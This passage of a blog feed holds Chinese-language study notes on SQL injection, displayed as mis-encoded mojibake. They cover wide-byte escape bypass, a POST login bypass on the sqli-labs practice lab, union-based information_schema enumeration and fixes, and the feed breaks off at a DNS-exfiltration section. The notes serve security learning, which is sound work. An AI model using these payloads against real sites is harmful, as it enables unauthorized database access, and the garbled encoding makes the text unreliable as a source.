        <content type="html"><![CDATA[<h3 id="å®½å­—èŠ‚sqlæ³¨å…¥çš„åŸç†"><a href="#å®½å­—èŠ‚sqlæ³¨å…¥çš„åŸç†" class="headerlink" title="å®½å­—èŠ‚sqlæ³¨å…¥çš„åŸç†"></a>å®½å­—èŠ‚sqlæ³¨å…¥çš„åŸç†</h3><p>gbkä½¿ç”¨çš„æ˜¯åŒå­—èŠ‚ç¼–ç ,è€Œutf8åˆ™æ˜¯ä¸‰å­—èŠ‚ã€‚</p><ol><li><p>å®½å­—èŠ‚æ³¨å…¥åŸå› æ˜¯è®¾ç½®çš„æ•°æ®åº“ç¼–ç å’Œphpç¼–ç æ˜¯ä¸¤ä¸ªä¸åŒçš„ç¼–ç ï¼Œå°±å¯èƒ½äº§ç”Ÿå®½å­—èŠ‚æ³¨å…¥æ¼æ´</p></li><li><p>å¦‚æœphpç¼–ç ä¸ºutf8,è€Œsqlè¯­å¥set names gbk è¿™æ ·é…ç½®å¯èƒ½ä¼šå¯¼è‡´ç¼–ç åœ¨è½¬æ¢æ—¶å‡ºç°æ³¨å…¥æ¼æ´ã€‚</p></li><li><p>set names x.å°±ç­‰åŒè®¾ç½®äº†æ•°æ®åº“è¿æ¥ï¼Œå‘å‡ºï¼Œæ¥æ”¶çš„ç¼–ç <br>(å®½å­—èŠ‚sqlæ³¨å…¥å°±æ˜¯phpåœ¨å‘é€æ•°æ®åˆ°æ•°æ®åº“è¿‡ç¨‹ä¸­ä½¿ç”¨äº†è¯­å¥è¿›è¡Œset names gbkæˆ–set claracter_set_client=gbk,ä½†ç”±äºè¢«ä¸€äº›å­—ç¬¦é›†è½¬æ¢è€Œå¯¼è‡´å®½å­—èŠ‚æ³¨å…¥)</p></li></ol><p>å…ˆå¼•å…¥ä¸€ä¸ªphpå‡½æ•°:</p><h3 id="megic-quotes-gpc-é­”æœ¯ä¿¡å·å¼€å…³"><a href="#megic-quotes-gpc-é­”æœ¯ä¿¡å·å¼€å…³" class="headerlink" title="megic_quotes_gpc(é­”æœ¯ä¿¡å·å¼€å…³):"></a><strong>megic_quotes_gpc(é­”æœ¯ä¿¡å·å¼€å…³):</strong></h3><p>å½“phpä¼ å‚æ—¶<strong>æœ‰ç‰¹æ®Šå­—ç¬¦å°±ä¼šåœ¨å‰é¢åŠ â€\â€æ¥è½¬è¯‘å­—ç¬¦</strong> æ¥è¿‡æ»¤ï¼Œæ¯”å¦‚å•å¼•å·ï¼ŒåŒå¼•å·ï¼Œåæ–œçº¿ï¼Œnullå­—ç¬¦ç­‰éƒ½ä¼šè¢«è½¬ä¹‰ã€‚(ä¼šå¯¹ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè½¬ä¹‰)<br>åœ¨phpä½œç”¨æ˜¯ <strong>åˆ¤æ–­è§£æç”¨æˆ·è¾“å…¥çš„æ•°æ®</strong>ï¼ŒåŒ…æ‹¬post, get , cookieä¼ è¿‡æ¥çš„<strong>å¯ç–‘æ•°æ®å¢åŠ è½¬ä¹‰å­—ç¬¦</strong>å¦‚â€\â€,å‡å°‘å¯ç–‘æ•°æ®å¯¹ç¨‹åºå’Œæ•°æ®åº“çš„å½±å“è€Œå¯¼è‡´å‡ºé”™ã€‚ å°±æ˜¯è¯´<strong>å¦‚æœæœ‰ç‰¹æ®Šå­—ç¬¦ï¼Œä»–å°±ä¼šåœ¨å‰é¢åŠ ä¸€ä¸ªåæ–œæ æ¥è¿›è¡Œè¿‡æ»¤</strong>ï¼Œé‚£æˆ‘ä»¬è¯¥å¦‚ä½•ç»•è¿‡å‘¢ï¼Ÿ</p><h2 id="ç»•è¿‡åŸç†ï¼š"><a href="#ç»•è¿‡åŸç†ï¼š" class="headerlink" title="ç»•è¿‡åŸç†ï¼š"></a><strong>ç»•è¿‡åŸç†ï¼š</strong></h2><p>åœ¨gbkç¼–ç ä¸­ï¼Œ\çš„ç¼–ç ä¸º%5c,è€Œä¸­æ–‡å­—ç¬¦â€è¿â€çš„ç¼–ç ä¸º%df%5c,é‚£ä¹ˆæˆ‘ä»¬å¯ä¸å¯ä»¥åœ¨è¿™é‡Œåšæ–‡ç« å‘¢ï¼Ÿ</p><p>æˆ‘ä»¬åœ¨ä½¿ç”¨å¼•å·å»æµ‹è¯•æ³¨å…¥çš„æ—¶å€™ï¼Œå¯èƒ½ä¼šè¢«\è½¬ä¹‰:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">selet * from admin where &apos;id=1\&apos;&apos; limit 0,1</span><br></pre></td></tr></table></figure></p><p>è¢«è½¬ä¹‰ä½¿æˆ‘ä»¬æ— æ³•è¿›è¡Œæ³¨å…¥ï¼Œé‚£æˆ‘ä»¬èƒ½ä¸èƒ½ä½¿ç”¨%dfå»å’Œ\ç¼–ç %5cç»“åˆï¼Œå˜æˆä¸€ä¸ªè¿å­—ï¼Œä½¿å¾—å•å¼•å·é—­åˆï¼Œâ€™é€ƒè¿‡â€™äº†è¢«è½¬ä¹‰çš„å‘½è¿ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">selet * from admin where &apos;id=-1%df%5c&apos; #&apos; limit 0,1</span><br></pre></td></tr></table></figure><p>è½¬ä¹‰å˜æˆï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">selet * from admin where &apos;id=-1è¿&apos; #&apos; limit 0,1</span><br></pre></td></tr></table></figure><p>è½¬ä¹‰åæ‰§è¡Œsqlè¯­å¥ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">selet * from admin where &apos;id=-1è¿&apos; union select 1,user()#&apos; limit 0,1</span><br></pre></td></tr></table></figure></p><p>è¿™æ˜¯å› ä¸ºphpå’Œmysqlä½¿ç”¨äº†ä¸¤ç§ç¼–ç ï¼Œä½¿è½¬ç è¿‡ç¨‹ä¸­å‡ºç°æ¼æ´ã€‚<br>å¦‚æœæˆ‘ä»¬è¾“å…¥%dfâ€,è€Œphpçš„é­”æœ¯å¼•å·ä¼šå¼ºåˆ¶çš„è½¬æ¢â€ï¼Œåœ¨å‰é¢åŠ åæ–œæ \â€ï¼Œè€Œ\ç­‰äº%5c,åˆ™ä»£ç æˆä¸º% df%5câ€ï¼Œè€Œ%df%5cç¼–ç ä¸ºè¿å­—ï¼Œå˜æˆè¿â€ï¼Œä»è€Œ\è½¬ä¹‰å­—ç¬¦è¢«åˆå¹¶äº†ï¼Œ(ä»è€Œç»•è¿‡è½¬ä¹‰ã€‚)</p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>postæ³¨å…¥</title>
      <link href="/2019/12/07/sql2/"/>
      <url>/2019/12/07/sql2/</url>
      
        <content type="html"><![CDATA[<h3 id="postæ³¨å…¥çš„ä»‹ç»"><a href="#postæ³¨å…¥çš„ä»‹ç»" class="headerlink" title="postæ³¨å…¥çš„ä»‹ç»"></a>postæ³¨å…¥çš„ä»‹ç»</h3><p>postæ³¨å…¥ä¹Ÿæ˜¯sqlæ³¨å…¥çš„ä¸€ç§ç±»å‹ï¼Œé€šè¿‡postè¿›è¡Œä¼ å‚çš„æ³¨å…¥ï¼Œpostä¼ å‚ä¸€èˆ¬æ˜¯é€šè¿‡è¡¨å•çš„æ–¹å¼æäº¤ï¼Œä½†æœ¬è´¨ä¸Šå’Œgetæ³¨å…¥æ²¡æœ‰å¤šå¤§çš„åŒºåˆ«ã€‚é€šè¿‡ä¼ªé€ æ’å…¥ä¿®æ”¹è¯­å¥ï¼Œä½¿å¾—ç”¨æˆ·æ’å…¥çš„æ•°æ®ä¹Ÿè¢«å½“æˆsqlä»£ç å»æ‰§è¡Œã€‚</p><h3 id="postæ³¨å…¥çš„é«˜å±ç‚¹"><a href="#postæ³¨å…¥çš„é«˜å±ç‚¹" class="headerlink" title="postæ³¨å…¥çš„é«˜å±ç‚¹**"></a>postæ³¨å…¥çš„é«˜å±ç‚¹**</h3><ul><li>ç½‘é¡µç™»é™†æ¡†</li><li>ç½‘é¡µæŸ¥è¯¢æ¡†</li><li>ä¸æ•°æ®åº“æœ‰äº¤äº’çš„æäº¤æ¡†</li></ul><p>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå½“æˆ‘ä»¬é€šè¿‡HTMLè¡¨å•æäº¤æ•°æ®åˆ°æœåŠ¡å™¨æ—¶ï¼ŒæœåŠ¡ç«¯éƒ½ä¼šåœ¨æ•°æ®åº“ä¸­æ£€æŸ¥æˆ‘ä»¬è¾“å…¥çš„æ•°æ®æ˜¯å¦ç¬¦åˆè¦æ±‚ï¼Œç„¶åæ ¹æ®æ•°æ®åº“æœç´¢ç»“æœè¿”å›ç›¸åº”çš„æ•°æ®ç»™å®¢æˆ·ç«¯ï¼Œä½†å¦‚æœæˆ‘ä»¬èƒ½æ§åˆ¶è¾“å…¥ï¼Œæ„é€ ä¸€äº›â€œæ¶æ„â€çš„SQLè¯­å¥ï¼Œâ€œæ¬ºéª—â€åå°æ•°æ®åº“æ‰§è¡Œç³»ç»Ÿä¸æ„¿æ„ç”¨æˆ·æ‰§è¡Œçš„æ“ä½œï¼Œé‚£ä¹ˆå°±äº§ç”Ÿäº†SQLæ³¨å…¥ã€‚è¿™å°±æ˜¯æˆ‘ä»¬å¸¸è¯´çš„POSTæ³¨å…¥ã€‚</p><p><strong>è¿™é‡Œä»¥sqli-less-11åšpostæ³¨å…¥ä¾‹é¢˜è®²è§£ï¼š</strong></p><p>æˆ‘ä»¬ç‚¹è¿›å»ï¼Œçœ‹åˆ°ä¸€å¼ ç™»é™†çš„è¡¨å•ï¼Œæˆ‘ä»¬æ€è€ƒä¸€ä¸‹åº”è¯¥å¦‚ä½•è¿›è¡Œæ³¨å…¥</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/IQ8PuQYXRfQeKFbKXgUUpLG8c0u9bRyDxpMCb8JUO7A!/b/dLkAAAAAAAAA&amp;bo=3wSdAQAAAAADB2U!&amp;rf=viewer_4" alt></p><p>æˆ‘ä»¬å…ˆé€šè¿‡ç”¨ä¸€ä¸ªå•å¼•å·åœ¨usernameä¸Šè¿›è¡Œæµ‹è¯•ï¼Œå‘ç°å‡ºç°é”™è¯¯ä¿¡æ¯ï¼Œç»“æœæ˜¾ç¤ºæ˜¯å¯¹â€™çš„å¤„ç†æ‰€äº§ç”Ÿçš„é”™è¯¯<br><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/.s0IqEEnc82GeYcsj6bUgw654mtuR57kW6RYZGKKnYU!/b/dFYBAAAAAAAA&amp;bo=8AWAAAAAAAADF0c!&amp;rf=viewer_4" alt></p><p>æˆ‘ä»¬é€šè¿‡é—­åˆâ€™,åœ¨å†åé¢åŠ ä¸Šor 1=1å†å°†åé¢æ³¨é‡Šæ‰ï¼Œç«Ÿç„¶å‘ç°ç™»é™†äº†è¿›å»<br><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/kb0Ha8Mr6gvwbdZjJfLhBBPpydpnzihcImL2JKqDjP8!/b/dLYAAAAAAAAA&amp;bo=MwY0AgAAAAADJwE!&amp;rf=viewer_4" alt></p><p>è¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿæ˜¾è€Œæ˜“è§ï¼Œor â€™1â€™ = â€˜1â€™æ’ä¸ºçœŸï¼Œè€Œä¸”#åé¢çš„å¯†ç ç›´æ¥è¢«æ³¨é‡Šäº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç›´æ¥ç™»å½•åˆ°åå°äº†ã€‚<br>é‚£æˆ‘ä»¬èƒ½ä¸èƒ½é€šè¿‡æ„é€  get æ³¨å…¥ä¸­ç”¨åˆ°çš„å…¶ä»–çš„è¯­å¥ä»£æ›¿ or 1=1 è¿›è¡Œæ³¨å…¥ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; order by 3#</span><br></pre></td></tr></table></figure><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/4LkCwAdfoqRthpNHMTnA.EeKDTK*IDTWRjU7*WDKHX4!/b/dLYAAAAAAAAA&amp;bo=tgQRAgAAAAADJ6M!&amp;rf=viewer_4" alt><br>ç™»é™†å¤±è´¥ï¼Œæ˜¾ç¤ºæŠ¥é”™</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; order by 2#</span><br></pre></td></tr></table></figure><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/n8nIF5JiU1*uydG*pNEl36opJ4RjWDONYFA.ivtECCE!/b/dL8AAAAAAAAA&amp;bo=lAS0AQAAAAADJyc!&amp;rf=viewer_4" alt><br>ç™»é™†å¤±è´¥ï¼Œæ— æ˜¾ç¤º,è¯´æ˜å­—æ®µä¸º2ã€‚</p><p>æˆ‘ä»¬å°è¯•ä¸‹çŒœæ•°æ®åº“ç‰ˆæœ¬ï¼š<br><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/cdMGniPDlkmYnllHrJ8gvx8RMgPKV7bG.DcxpiXeJj8!/b/dFQBAAAAAAAA&amp;bo=jwGZAAAAAAADFyU!&amp;rf=viewer_4" alt></p><p>å‘ç°ä¸ä»…ç™»é™†æˆåŠŸï¼Œå¹¶çˆ†å‡ºäº†ç‰ˆæœ¬å·<br><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/49Ye2S7pk7SkFSpT1If6A2IfwjT24AjCvEEdme0Plwg!/b/dFQBAAAAAAAA&amp;bo=QgPcAAAAAAADF68!&amp;rf=viewer_4" alt></p><p>è¿™æ—¶çš„sqlè¯­å¥å¦‚ä¸‹ï¼š<br><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/GQZ9l8h2oJXVpEu6vbrD87kOiB1DuduyH7aVTXGPsUQ!/b/dL4AAAAAAAAA&amp;bo=LAdfAAAAAAADF0Y!&amp;rf=viewer_4" alt><br>å»æ•°æ®åº“æŸ¥è¯¢äº†username=1ï¼Œä½†æŸ¥è¯¢ä¸åˆ°ï¼Œåˆ™è”åˆæŸ¥è¯¢äº†åé¢çš„è¯­å¥ï¼Œçˆ†å‡ºäº†æ•°æ®åº“ç‰ˆæœ¬5.5.53ï¼›</p><p>åœ¨çˆ†å‡ºæ•°æ®åº“<br><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/JClWQRPGxeIFbUauSoQ2SczVYuSJmlM5JW.2AyJPhNY!/b/dLgAAAAAAAAA&amp;bo=RQfGAQAAAAADB6c!&amp;rf=viewer_4" alt></p><p>å†é€šè¿‡ç³»ç»Ÿåº“çˆ†å‡ºè¡¨ï¼Œå­—æ®µï¼Œæ¥è¿›ä¸€æ­¥è¿›è¡Œæ³¨å…¥ï¼</p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2019/12/07/sql1/"/>
      <url>/2019/12/07/sql1/</url>
      
        <content type="html"><![CDATA[<h2 id="sql-injectionä»‹ç»ï¼š"><a href="#sql-injectionä»‹ç»ï¼š" class="headerlink" title="sql injectionä»‹ç»ï¼š"></a>sql injectionä»‹ç»ï¼š</h2><hr><p>æˆ‘ä»¬ç§°ä¹‹ä¸º sql æ³¨å…¥ã€‚ä½•ä¸º sqlï¼Œè‹±æ–‡ï¼šStructured Query Languageï¼Œ<br>å«åšç»“æ„åŒ–æŸ¥è¯¢è¯­è¨€ã€‚å¸¸è§çš„ç»“æ„åŒ–æ•°æ®åº“æœ‰ MySQLï¼ŒMS SQL ,Oracle ä»¥åŠ Postgresqlã€‚Sql<br>è¯­è¨€å°±æ˜¯æˆ‘ä»¬åœ¨ç®¡ç†æ•°æ®åº“æ—¶ç”¨åˆ°çš„ä¸€ç§ã€‚åœ¨æˆ‘ä»¬çš„åº”ç”¨ç³»ç»Ÿä½¿ç”¨ sql è¯­å¥è¿›è¡Œç®¡ç†åº”ç”¨æ•°<br>æ®åº“æ—¶ï¼Œå¾€å¾€<code>é‡‡ç”¨æ‹¼æ¥çš„æ–¹å¼å½¢æˆä¸€æ¡å®Œæ•´çš„æ•°æ®åº“è¯­è¨€ï¼Œè€Œå±é™©çš„æ˜¯ï¼Œåœ¨æ‹¼æ¥ sql è¯­å¥çš„<br>æ—¶å€™ï¼Œæ²¡æœ‰å¯¹æ‹¼æ¥æ•°æ®è¿›è¡Œè¿‡æ»¤æˆ–è€…è¿‡æ»¤ä¸ä¸¥è°¨ï¼Œå¯¼è‡´æˆ‘ä»¬å¯ä»¥æ”¹å˜ sql è¯­å¥ã€‚ä»è€Œè®©æ•°æ®æ‰§è¡Œæˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„è¯­å¥</code>ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬å¸¸è¯´çš„sqlæ³¨å…¥ã€‚</p><h2 id="sqlæ³¨å…¥å®ç°çš„ä¸¤å¤§æ¡ä»¶"><a href="#sqlæ³¨å…¥å®ç°çš„ä¸¤å¤§æ¡ä»¶" class="headerlink" title="sqlæ³¨å…¥å®ç°çš„ä¸¤å¤§æ¡ä»¶"></a>sqlæ³¨å…¥å®ç°çš„ä¸¤å¤§æ¡ä»¶</h2><p>1.ç”¨æˆ·èƒ½å¤Ÿæ§åˆ¶è¾“å‡º.</p><p>2.åŸæœ¬ç¨‹åºè¦æ‰§è¡Œçš„ä»£ç ï¼Œæ‹¼æ¥äº†ç”¨æˆ·è¾“å…¥çš„æ•°æ®</p><h2 id="sqlæ³¨å…¥æ”»å‡»çš„åŸç†"><a href="#sqlæ³¨å…¥æ”»å‡»çš„åŸç†" class="headerlink" title="sqlæ³¨å…¥æ”»å‡»çš„åŸç†"></a>sqlæ³¨å…¥æ”»å‡»çš„åŸç†</h2><p>ç®€å•çš„è¯´å°±æ˜¯å°†ç”¨æˆ·è¾“å‡ºçš„æ•°æ®å½“æˆä»£ç ç„¶åè¢«æœåŠ¡å™¨æ”¾åˆ°æ•°æ®åº“ä¸Šå»æ‰§è¡Œã€‚</p><p>æ¯”å¦‚åŸå§‹æ•°æ®åº“è¯­å¥ä¸ºselect username from users where id =â€™$aâ€™;</p><p>è€Œ$aæ˜¯æˆ‘ä»¬å¯æ§çš„å‚æ•°ï¼Œé‚£ä¹ˆå°±å¾ˆæœ‰å¯èƒ½è¢«æ”»å‡»è€…æ‰€åˆ©ç”¨ï¼Œä»è€Œæ„é€ æ¶æ„è¯­å¥å¦‚ä¸‹ï¼š</p><p>1â€™ union select 1,databases(),user()â€“+</p><p>æ”»å‡»è€…è¾“å…¥çš„è¯­å¥ç›´æ¥å¸¦å…¥æ•°æ®åº“è¿›è¡ŒæŸ¥è¯¢ï¼Œæ•°æ®åº“è¯­å¥å¦‚ä¸‹ï¼š</p><p>select username from users where id = â€˜1â€™ union select 1,databases(),user() â€“+â€™</p><p>åœ¨è¿™é‡Œçš„â€“+æ˜¯æ³¨é‡Šçš„æ„æ€ï¼Œä¼šå°†æ³¨é‡Šç¬¦åçš„è¯­å¥è¿›è¡Œæ³¨é‡Šï¼Œé‚£ä¹ˆæˆ‘ä»¬è¦åšçš„å°±æ˜¯å°†å‰é¢çš„è¯­å¥é—­åˆï¼Œæ‰€ä»¥æ„é€ 1â€™ï¼Œé—­åˆå‰é¢çš„è¯­å¥ã€‚æ¥ç€è¦åšçš„å°±æ˜¯æ„é€ æ”»å‡»è€…æƒ³è¦çš„æŸ¥è¯¢è¯­å¥ï¼šunion select 1,databases(),user() ï¼Œç”±äºæˆ‘ä»¬æ‰‹åŠ¨é—­åˆåï¼Œè¯­å¥åé¢ä¼šå¤šå‡ºæ¥ä¸€ä¸ªå¼•å·ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ³¨é‡Šç¬¦è¿›è¡Œæ³¨é‡Šï¼Œä»è€Œè¾¾åˆ°è¯­å¥æ‹¼æ¥çš„ç›®çš„ã€‚</p><h2 id="SQLæ³¨å…¥æ”»å‡»çš„å…¸å‹æ‰‹æ®µ"><a href="#SQLæ³¨å…¥æ”»å‡»çš„å…¸å‹æ‰‹æ®µ" class="headerlink" title="SQLæ³¨å…¥æ”»å‡»çš„å…¸å‹æ‰‹æ®µ"></a>SQLæ³¨å…¥æ”»å‡»çš„å…¸å‹æ‰‹æ®µ</h2><ol><li>åˆ¤æ–­åº”ç”¨ç¨‹åºæ˜¯å¦å­˜åœ¨æ³¨å…¥æ¼æ´</li><li>æ”¶é›†ä¿¡æ¯ã€å¹¶åˆ¤æ–­æ•°æ®åº“ç±»å‹</li><li>æ ¹æ®æ³¨å…¥å‚æ•°ç±»å‹ï¼Œé‡æ„SQLè¯­å¥çš„åŸè²Œ</li><li>çŒœè§£åº“åã€è¡¨åã€å­—æ®µå</li><li>è·å–è´¦æˆ·ä¿¡æ¯ã€æ”»å‡»webæˆ–ä¸ºä¸‹ä¸€æ­¥æ”»å‡»åšå‡†å¤‡</li></ol><h2 id="information-schemaåº“"><a href="#information-schemaåº“" class="headerlink" title="information_schemaåº“"></a>information_schemaåº“</h2><p>åœ¨mysql5.0ä»¥ä¸Šçš„ç‰ˆæœ¬ä¸­ï¼Œä¸ºäº†æ–¹ä¾¿ç®¡ç†ï¼Œç³»ç»Ÿè‡ªåŠ¨ç”Ÿæˆäº†information_schemaè¿™ä¸ªç³»ç»Ÿåº“ï¼Œç”¨æ¥å­˜å‚¨æ•°æ®åº“å…ƒä¿¡æ¯ã€‚å…¶ä¸­å°±æœ‰æˆ‘ä»¬åœ¨æ³¨å…¥ä¸­éœ€è¦ç”¨åˆ°çš„ä¸€äº›è¡¨ï¼šschemata(æ•°æ®åº“å)ã€tables(è¡¨å)ã€columns(åˆ—åæˆ–å­—æ®µå)ï¼Œé€šå¸¸æˆ‘ä»¬å¯ä»¥é€šè¿‡ç³»ç»Ÿåº“æŸ¥è¯¢åˆ°å¾ˆå¤šä¿¡æ¯ï¼Œæœ€å¸¸è§çš„mysqlæ³¨å…¥ä¹Ÿæ˜¯æ ¹æ®è¯¥åº“æ¥å®Œæˆçš„ã€‚</p><p><strong>åœ¨schemataè¡¨ä¸­ï¼Œschema_nameå­—æ®µç”¨æ¥å­˜å‚¨æ•°æ®åº“åã€‚</strong></p><p><strong>åœ¨tablesè¡¨ä¸­ï¼Œtable_schemaå’Œtable_nameåˆ†åˆ«ç”¨æ¥å­˜å‚¨æ•°æ®åå’Œè¡¨åã€‚</strong></p><p><strong>åœ¨columnsè¡¨ä¸­ï¼Œtable_schema(æ•°æ®åº“å)ã€table_name(è¡¨å)ã€column_name(å­—æ®µå)</strong></p><h2 id="ä¸€èˆ¬çš„æ•°æ®æ³¨å…¥æµç¨‹ä¸ºï¼š"><a href="#ä¸€èˆ¬çš„æ•°æ®æ³¨å…¥æµç¨‹ä¸ºï¼š" class="headerlink" title="ä¸€èˆ¬çš„æ•°æ®æ³¨å…¥æµç¨‹ä¸ºï¼š"></a>ä¸€èˆ¬çš„æ•°æ®æ³¨å…¥æµç¨‹ä¸ºï¼š</h2><p><strong>åˆ¤æ–­æ³¨å…¥è¯­å¥ç»“æ„ï¼š</strong><br>id=$a<br>id=â€™$aâ€™<br>id=($a)<br>search =%$a%<br>â€¦</p><p><strong>åˆ¤æ–­é—­åˆåï¼Œåˆ¤æ–­å­—æ®µæ•°ï¼š</strong><br>ç”±äºunionæŸ¥è¯¢æ˜¯éœ€è¦å­—æ®µå‰åä¸€è‡´ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åˆ¤æ–­å­—æ®µï¼Œå­—æ®µæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<strong>order by</strong>è¿›è¡Œåˆ¤æ–­ï¼Œorder by æ˜¯mysqlç”¨æ¥è¿›è¡Œå­—æ®µæ’åºçš„ï¼Œæ¯”å¦‚order by 1ï¼Œå°±ä¼šæ ¹æ®ç¬¬ä¸€ä¸ªå­—æ®µè¿›è¡Œæ’åºï¼Œorder by 2,å°±ä¼šæ ¹æ®ç¬¬äºŒä¸ªå­—æ®µè¿›è¡Œæ’åºã€‚ä½†å¦‚æœæŸ¥è¯¢çš„æ•°æ®åªæœ‰2ä¸ªå­—æ®µï¼Œé‚£ä¹ˆæˆ‘ä»¬æ‰§è¡Œorder by 3å°±ä¼šè¿›è¡ŒæŠ¥é”™ï¼Œå› ä¸ºä¸å­˜åœ¨ç¬¬ä¸‰ä¸ªå­—æ®µã€‚æˆ‘ä»¬å¯ä»¥æ ¹æ®è¿™ä¸ªåŸç†æ¥è¿›è¡Œåˆ¤æ–­æ•°æ®åº“å­˜åœ¨å¤šå°‘ä¸ªå­—æ®µã€‚<br>order by 1<br>order by 2<br>order by 3<br>â€¦</p><p><strong>æµ‹è¯•å›æ˜¾ä½ï¼š</strong><br>ç»å…¸çš„è”åˆæŸ¥è¯¢æ˜¯éœ€è¦å­˜åœ¨å›æ˜¾å­—æ®µçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æµ‹è¯•å‡ºå›æ˜¾ä½ï¼š</p><p>union select 1,2,3</p><p><strong>æŸ¥è¯¢å½“å‰æ•°æ®åº“</strong></p><p>select schema_name from information_schema.schemata</p><p><strong>æŸ¥è¯¢è¡¨å</strong></p><p>select table_name from information_schema.tables where table_schema=â€æ•°æ®åº“åâ€</p><p><strong>æŸ¥è¯¢å­—æ®µå</strong><br>select column_name from information_schema.columns where table_name=â€è¡¨åâ€</p><p><strong>æŸ¥è¯¢å­—æ®µæ•°æ®</strong></p><p>select å­—æ®µå from è¡¨</p><h2 id="SQLæ³¨å…¥æ˜¯æ€ä¹ˆäº§ç”Ÿçš„ï¼Ÿ"><a href="#SQLæ³¨å…¥æ˜¯æ€ä¹ˆäº§ç”Ÿçš„ï¼Ÿ" class="headerlink" title="SQLæ³¨å…¥æ˜¯æ€ä¹ˆäº§ç”Ÿçš„ï¼Ÿ"></a>SQLæ³¨å…¥æ˜¯æ€ä¹ˆäº§ç”Ÿçš„ï¼Ÿ</h2><ol><li><p>WEBå¼€å‘äººå‘˜æ— æ³•ä¿è¯æ‰€æœ‰çš„è¾“å…¥éƒ½å·²ç»è¿‡æ»¤</p></li><li><p>æ”»å‡»è€…åˆ©ç”¨å‘é€ç»™SQLæœåŠ¡å™¨çš„è¾“å…¥å‚æ•°æ„é€ å¯æ‰§è¡Œçš„SQLä»£ç ï¼ˆå¯åŠ å…¥åˆ°getè¯·æ±‚ã€postè¯·æ±‚ã€httpå¤´ä¿¡æ¯ã€cookieä¸­ï¼‰</p></li><li><p>æ•°æ®åº“æœªåšç›¸åº”çš„å®‰å…¨é…ç½®</p></li></ol><h2 id="æ•°æ®åº“ä¿®å¤å»ºè®®"><a href="#æ•°æ®åº“ä¿®å¤å»ºè®®" class="headerlink" title="æ•°æ®åº“ä¿®å¤å»ºè®®"></a>æ•°æ®åº“ä¿®å¤å»ºè®®</h2><ol><li>å¯¹æ•°æ®åº“è¿›è¡Œä¸¥æ ¼ç›‘æ§</li><li>å¯¹ç”¨æˆ·æäº¤çš„æ•°æ®è¿›è¡Œä¸¥æ ¼è¿‡æ»¤</li><li>å¯¹æ•°æ®åº“å†…å®¹è¿›è¡ŒåŠ å¯†</li><li>ä»£ç å±‚æœ€ä½³é˜²å¾¡sqlæ¼æ´æ–¹æ¡ˆï¼šé‡‡ç”¨sqlè¯­å¥é¢„ç¼–è¯‘å’Œç»‘å®šå˜é‡ï¼Œæ˜¯é˜²å¾¡sqlæ³¨å…¥çš„æœ€ä½³æ–¹æ³•</li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>mysql-dnsæ³¨å…¥</title>
      <link href="/2019/12/07/sql-dnslog/"/>
      <url>/2019/12/07/sql-dnslog/</url>
      
        <content type="html"><![CDATA[<h2 id="dnsæ³¨å…¥çš„ä½¿ç”¨åœºæ™¯ï¼š"><a href="#dnsæ³¨å…¥çš„ä½¿ç”¨åœºæ™¯ï¼š" class="headerlink" title="dnsæ³¨å…¥çš„ä½¿ç”¨åœºæ™¯ï¼š"></a>dnsæ³¨å…¥çš„ä½¿ç”¨åœºæ™¯ï¼š</h2><p>åœ¨æŸäº›æ— æ³•ç›´æ¥åˆ©ç”¨æ³¨å…¥æ¼æ´è·å¾—å›æ˜¾çš„æƒ…å†µä¸‹ï¼Œä½†ç›®æ ‡è¿˜æ˜¯å¯ä»¥å‘èµ·dnsè¯·æ±‚ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡dnsè§£ææŠŠè·å¾—çš„æ•°æ®å¤–å¸¦å‡ºå»ã€‚</p><p>å¯¹äºsqlç›²æ³¨é€šå¸¸æ˜¯ä½¿ç”¨äºŒåˆ†æ³•å»ä¸€æ­¥æ­¥çŒœï¼Œä½†æ˜¯æ­¤æ–¹æ³•ç¹çä¸è¯´ï¼Œè€Œä¸”å› ä¸ºä¸æ–­å‘æœåŠ¡å™¨å‘é€æ•°æ®è¯·æ±‚ï¼Œè€Œå¯¼è‡´è¢«banï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡select<br>åˆ°çš„æ•°æ®å‘é€åˆ°ä¸€ä¸ªurlä¸Šï¼Œåˆ©ç”¨dnsè§£æäº§ç”Ÿçš„è®°å½•æ—¥å¿—æ¥æŸ¥çœ‹æ•°æ®ï¼›</p><h2 id="dnsä½¿ç”¨å‡½æ•°è§£æï¼š"><a 